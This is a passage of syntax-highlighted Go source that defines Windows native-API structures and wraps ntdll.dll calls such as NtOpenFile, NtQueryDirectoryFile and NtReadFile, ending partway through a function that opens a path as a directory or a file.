</span></span><span class="line"><span class="ln"> 37</span><span class="cl">	<span class="nx">ObjectName</span>               <span class="o">*</span><span class="nx">UNICODE_STRING</span>
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">	<span class="nx">Attributes</span>               <span class="kt">uint32</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">	<span class="nx">SecurityDescriptor</span>       <span class="kt">uintptr</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">	<span class="nx">SecurityQualityOfService</span> <span class="kt">uintptr</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">
</span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="kd">type</span> <span class="nx">IO_STATUS_BLOCK</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl">	<span class="nx">Status</span>      <span class="kt">uintptr</span>
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">	<span class="nx">Information</span> <span class="kt">uintptr</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">
</span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="kd">type</span> <span class="nx">FILE_DIRECTORY_INFORMATION</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">	<span class="nx">NextEntryOffset</span> <span class="kt">uint32</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">	<span class="nx">FileIndex</span>       <span class="kt">uint32</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">	<span class="nx">CreationTime</span>    <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">	<span class="nx">LastAccessTime</span>  <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">	<span class="nx">LastWriteTime</span>   <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl">	<span class="nx">ChangeTime</span>      <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">	<span class="nx">EndOfFile</span>       <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">	<span class="nx">AllocationSize</span>  <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">	<span class="nx">FileAttributes</span>  <span class="kt">uint32</span>
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">	<span class="nx">FileNameLength</span>  <span class="kt">uint32</span>
</span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">
</span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="kd">type</span> <span class="nx">FILE_BASIC_INFORMATION</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl">	<span class="nx">CreationTime</span>   <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 63</span><span class="cl">	<span class="nx">LastAccessTime</span> <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl">	<span class="nx">LastWriteTime</span>  <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">	<span class="nx">ChangeTime</span>     <span class="kt">int64</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">	<span class="nx">FileAttributes</span> <span class="kt">uint32</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">
</span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="kd">var</span> <span class="p">(</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">	<span class="nx">dll</span>                      <span class="p">=</span> <span class="nx">syscall</span><span class="p">.</span><span class="nf">NewLazyDLL</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">	<span class="nx">procOpenFile</span>             <span class="p">=</span> <span class="nx">dll</span><span class="p">.</span><span class="nf">NewProc</span><span class="p">(</span><span class="s">&#34;NtOpenFile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">	<span class="nx">procClose</span>                <span class="p">=</span> <span class="nx">dll</span><span class="p">.</span><span class="nf">NewProc</span><span class="p">(</span><span class="s">&#34;NtClose&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">	<span class="nx">procQueryDirectoryFile</span>   <span class="p">=</span> <span class="nx">dll</span><span class="p">.</span><span class="nf">NewProc</span><span class="p">(</span><span class="s">&#34;NtQueryDirectoryFile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">	<span class="nx">procReadFile</span>             <span class="p">=</span> <span class="nx">dll</span><span class="p">.</span><span class="nf">NewProc</span><span class="p">(</span><span class="s">&#34;NtReadFile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">	<span class="nx">procQueryInformationFile</span> <span class="p">=</span> <span class="nx">dll</span><span class="p">.</span><span class="nf">NewProc</span><span class="p">(</span><span class="s">&#34;NtQueryInformationFile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">	<span class="nx">procRtlInitUnicodeString</span> <span class="p">=</span> <span class="nx">dll</span><span class="p">.</span><span class="nf">NewProc</span><span class="p">(</span><span class="s">&#34;RtlInitUnicodeString&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">
</span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="kd">func</span> <span class="nf">rtlInitUnicodeString</span><span class="p">(</span><span class="nx">destinationString</span> <span class="o">*</span><span class="nx">UNICODE_STRING</span><span class="p">,</span> <span class="nx">sourceString</span> <span class="o">*</span><span class="kt">uint16</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">	<span class="nx">procRtlInitUnicodeString</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">destinationString</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">sourceString</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">
</span></span><span class="line"><span class="ln"> 86</span><span class="cl"><span class="kd">func</span> <span class="nf">openFile</span><span class="p">(</span><span class="nx">fileHandle</span> <span class="o">*</span><span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">desiredAccess</span> <span class="kt">uint32</span><span class="p">,</span> <span class="nx">objectAttributes</span> <span class="o">*</span><span class="nx">OBJECT_ATTRIBUTES</span><span class="p">,</span> <span class="nx">ioStatusBlock</span> <span class="o">*</span><span class="nx">IO_STATUS_BLOCK</span><span class="p">,</span> <span class="nx">shareAccess</span> <span class="kt">uint32</span><span class="p">,</span> <span class="nx">openOptions</span> <span class="kt">uint32</span><span class="p">)</span> <span class="kt">uint32</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">	<span class="nx">ret</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">procOpenFile</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">fileHandle</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">desiredAccess</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">objectAttributes</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">ioStatusBlock</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">shareAccess</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">openOptions</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">	<span class="k">return</span> <span class="nb">uint32</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">
</span></span><span class="line"><span class="ln"> 98</span><span class="cl"><span class="kd">func</span> <span class="nf">HandleClose</span><span class="p">(</span><span class="nx">handle</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">)</span> <span class="kt">uint32</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">	<span class="nx">ret</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">procClose</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span><span class="nb">uintptr</span><span class="p">(</span><span class="nx">handle</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">	<span class="k">return</span> <span class="nb">uint32</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">
</span></span><span class="line"><span class="ln">103</span><span class="cl"><span class="kd">func</span> <span class="nf">queryDirectoryFile</span><span class="p">(</span><span class="nx">fileHandle</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">event</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">apcRoutine</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="nx">apcContext</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="nx">ioStatusBlock</span> <span class="o">*</span><span class="nx">IO_STATUS_BLOCK</span><span class="p">,</span> <span class="nx">fileInformation</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="nx">length</span> <span class="kt">uint32</span><span class="p">,</span> <span class="nx">fileInformationClass</span> <span class="kt">uint32</span><span class="p">,</span> <span class="nx">returnSingleEntry</span> <span class="kt">bool</span><span class="p">,</span> <span class="nx">fileName</span> <span class="o">*</span><span class="nx">UNICODE_STRING</span><span class="p">,</span> <span class="nx">restartScan</span> <span class="kt">bool</span><span class="p">)</span> <span class="kt">uint32</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">	<span class="kd">var</span> <span class="nx">singleEntry</span> <span class="kt">uintptr</span> <span class="p">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">	<span class="k">if</span> <span class="nx">returnSingleEntry</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">106</span><span class="cl">		<span class="nx">singleEntry</span> <span class="p">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">	<span class="kd">var</span> <span class="nx">restart</span> <span class="kt">uintptr</span> <span class="p">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">	<span class="k">if</span> <span class="nx">restartScan</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">		<span class="nx">restart</span> <span class="p">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">111</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl">
</span></span><span class="line"><span class="ln">113</span><span class="cl">	<span class="nx">ret</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">procQueryDirectoryFile</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">fileHandle</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">event</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">116</span><span class="cl">		<span class="nx">apcRoutine</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">		<span class="nx">apcContext</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">118</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">ioStatusBlock</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">		<span class="nx">fileInformation</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">length</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">121</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">fileInformationClass</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">		<span class="nx">singleEntry</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">fileName</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl">		<span class="nx">restart</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">125</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">	<span class="k">return</span> <span class="nb">uint32</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">
</span></span><span class="line"><span class="ln">129</span><span class="cl"><span class="kd">func</span> <span class="nf">readFile</span><span class="p">(</span><span class="nx">fileHandle</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">event</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">apcRoutine</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="nx">apcContext</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="nx">ioStatusBlock</span> <span class="o">*</span><span class="nx">IO_STATUS_BLOCK</span><span class="p">,</span> <span class="nx">buffer</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="nx">length</span> <span class="kt">uint32</span><span class="p">,</span> <span class="nx">byteOffset</span> <span class="o">*</span><span class="kt">int64</span><span class="p">,</span> <span class="nx">key</span> <span class="kt">uintptr</span><span class="p">)</span> <span class="kt">uint32</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl">	<span class="nx">ret</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">procReadFile</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">131</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">fileHandle</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">event</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">		<span class="nx">apcRoutine</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">		<span class="nx">apcContext</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">135</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">ioStatusBlock</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">		<span class="nx">buffer</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">length</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">byteOffset</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">		<span class="nx">key</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">140</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">	<span class="k">return</span> <span class="nb">uint32</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">142</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">
</span></span><span class="line"><span class="ln">144</span><span class="cl"><span class="kd">func</span> <span class="nf">queryInformationFile</span><span class="p">(</span><span class="nx">fileHandle</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">ioStatusBlock</span> <span class="o">*</span><span class="nx">IO_STATUS_BLOCK</span><span class="p">,</span> <span class="nx">fileInformation</span> <span class="kt">uintptr</span><span class="p">,</span> <span class="nx">length</span> <span class="kt">uint32</span><span class="p">,</span> <span class="nx">fileInformationClass</span> <span class="kt">uint32</span><span class="p">)</span> <span class="kt">uint32</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">	<span class="nx">ret</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">procQueryInformationFile</span><span class="p">.</span><span class="nf">Call</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">fileHandle</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">ioStatusBlock</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl">		<span class="nx">fileInformation</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">149</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">length</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">150</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">fileInformationClass</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">	<span class="k">return</span> <span class="nb">uint32</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">154</span><span class="cl">
</span></span><span class="line"><span class="ln">155</span><span class="cl"><span class="kd">func</span> <span class="nf">stringToUTF16Ptr</span><span class="p">(</span><span class="nx">s</span> <span class="kt">string</span><span class="p">)</span> <span class="o">*</span><span class="kt">uint16</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">	<span class="nx">utf16</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">syscall</span><span class="p">.</span><span class="nf">UTF16FromString</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">158</span><span class="cl">		<span class="k">return</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl">	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">utf16</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">161</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">
</span></span><span class="line"><span class="ln">163</span><span class="cl"><span class="kd">func</span> <span class="nf">utf16PtrToString</span><span class="p">(</span><span class="nx">ptr</span> <span class="o">*</span><span class="kt">uint16</span><span class="p">,</span> <span class="nx">length</span> <span class="kt">uint32</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl">	<span class="k">if</span> <span class="nx">ptr</span> <span class="o">==</span> <span class="kc">nil</span> <span class="o">||</span> <span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">165</span><span class="cl">		<span class="k">return</span> <span class="s">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">
</span></span><span class="line"><span class="ln">168</span><span class="cl">	<span class="nx">slice</span> <span class="o">:=</span> <span class="p">(</span><span class="o">*</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="kt">uint16</span><span class="p">)(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">ptr</span><span class="p">))[:</span><span class="nx">length</span><span class="o">/</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">	<span class="k">return</span> <span class="nx">syscall</span><span class="p">.</span><span class="nf">UTF16ToString</span><span class="p">(</span><span class="nx">slice</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">171</span><span class="cl">
</span></span><span class="line"><span class="ln">172</span><span class="cl"><span class="kd">func</span> <span class="nf">OpenPath</span><span class="p">(</span><span class="nx">path</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="kt">bool</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl">	<span class="kd">var</span> <span class="nx">objectNameDir</span> <span class="nx">UNICODE_STRING</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">	<span class="kd">var</span> <span class="nx">handle</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span>
</span></span><span class="line"><span class="ln">175</span><span class="cl">	<span class="kd">var</span> <span class="nx">iosb</span> <span class="nx">IO_STATUS_BLOCK</span>
</span></span><span class="line"><span class="ln">176</span><span class="cl">	<span class="nx">pathDirPtr</span> <span class="o">:=</span> <span class="nf">stringToUTF16Ptr</span><span class="p">(</span><span class="nx">path</span> <span class="o">+</span> <span class="s">`\`</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl">	<span class="nf">rtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">objectNameDir</span><span class="p">,</span> <span class="nx">pathDirPtr</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">
</span></span><span class="line"><span class="ln">179</span><span class="cl">	<span class="nx">objAttrDir</span> <span class="o">:=</span> <span class="nx">OBJECT_ATTRIBUTES</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">		<span class="nx">Length</span><span class="p">:</span>     <span class="nb">uint32</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Sizeof</span><span class="p">(</span><span class="nx">OBJECT_ATTRIBUTES</span><span class="p">{})),</span>
</span></span><span class="line"><span class="ln">181</span><span class="cl">		<span class="nx">ObjectName</span><span class="p">:</span> <span class="o">&amp;</span><span class="nx">objectNameDir</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">182</span><span class="cl">		<span class="nx">Attributes</span><span class="p">:</span> <span class="nx">OBJ_CASE_INSENSITIVE</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">183</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">
</span></span><span class="line"><span class="ln">185</span><span class="cl">	<span class="nx">status</span> <span class="o">:=</span> <span class="nf">openFile</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">186</span><span class="cl">		<span class="o">&amp;</span><span class="nx">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">187</span><span class="cl">		<span class="nx">FILE_LIST_DIRECTORY</span><span class="p">|</span><span class="nx">FILE_READ_ATTRIBUTES</span><span class="p">|</span><span class="nx">SYNCHRONIZE</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl">		<span class="o">&amp;</span><span class="nx">objAttrDir</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">189</span><span class="cl">		<span class="o">&amp;</span><span class="nx">iosb</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">190</span><span class="cl">		<span class="nx">FILE_SHARE_READ</span><span class="p">|</span><span class="nx">FILE_SHARE_WRITE</span><span class="p">|</span><span class="nx">FILE_SHARE_DELETE</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">191</span><span class="cl">		<span class="nx">FILE_DIRECTORY_FILE</span><span class="p">|</span><span class="nx">FILE_SYNCHRONOUS_IO_NONALERT</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">192</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln">193</span><span class="cl">
</span></span><span class="line"><span class="ln">194</span><span class="cl">	<span class="k">if</span> <span class="nx">status</span> <span class="o">==</span> <span class="nx">STATUS_SUCCESS</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">195</span><span class="cl">		<span class="k">return</span> <span class="nx">handle</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="ln">196</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">197</span><span class="cl">
</span></span><span class="line"><span class="ln">198</span><span class="cl">	<span class="kd">var</span> <span class="nx">objectNameFile</span> <span class="nx">UNICODE_STRING</span>
</span></span><span class="line"><span class="ln">199</span><span class="cl">	<span class="nx">pathFilePtr</span> <span class="o">:=</span> <span class="nf">stringToUTF16Ptr</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">200</span><span class="cl">	<span class="nf">rtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">objectNameFile</span><span class="p">,</span> <span class="nx">pathFilePtr</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">201</span><span class="cl">
</span></span><span class="line"><span class="ln">202</span><span class="cl">	<span class="nx">objAttrFile</span> <span class="o">:=</span> <span class="nx">OBJECT_ATTRIBUTES</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">203</span><span class="cl">		<span class="nx">Length</span><span class="p">:</span>     <span class="nb">uint32</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Sizeof</span><span class="p">(</span><span class="nx">OBJECT_ATTRIBUTES</span><span class="p">{})),</span>
</span></span><span class="line"><span class="ln">204</span><span class="cl">		<span class="nx">ObjectName</span><span class="p">:</span> <span class="o">&amp;</span><span class="nx">objectNameFile</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">205</span><span class="cl">		<span class="nx">Attributes</span><span class="p">:</span> <span class="nx">OBJ_CASE_INSENSITIVE</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">206</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">207</span><span class="cl">
</span></span><span class="line"><span class="ln">208</span><span class="cl">	<span class="nx">status</span> <span class="p">=</span> <span class="nf">openFile</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">209</span><span class="cl">		<span class="o">&amp;</span><span class="nx">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">210</span><span class="cl">		<span class="nx">FILE_READ_DATA</span><span class="p">|</span><span class="nx">FILE_READ_ATTRIBUTES</span><span class="p">|</span><span class="nx">SYNCHRONIZE</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">211</span><span class="cl">		<span class="o">&amp;</span><span class="nx">objAttrFile</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">212</span><span class="cl">		<span class="o">&amp;</span><span class="nx">iosb</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">213</span><span class="cl">		<span class="nx">FILE_SHARE_READ</span><span class="p">|</span><span class="nx">FILE_SHARE_WRITE</span><span class="p">|</span><span class="nx">FILE_SHARE_DELETE</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">214</span><span class="cl">		<span class="nx">FILE_SYNCHRONOUS_IO_NONALERT</span><span class="p">,</span>
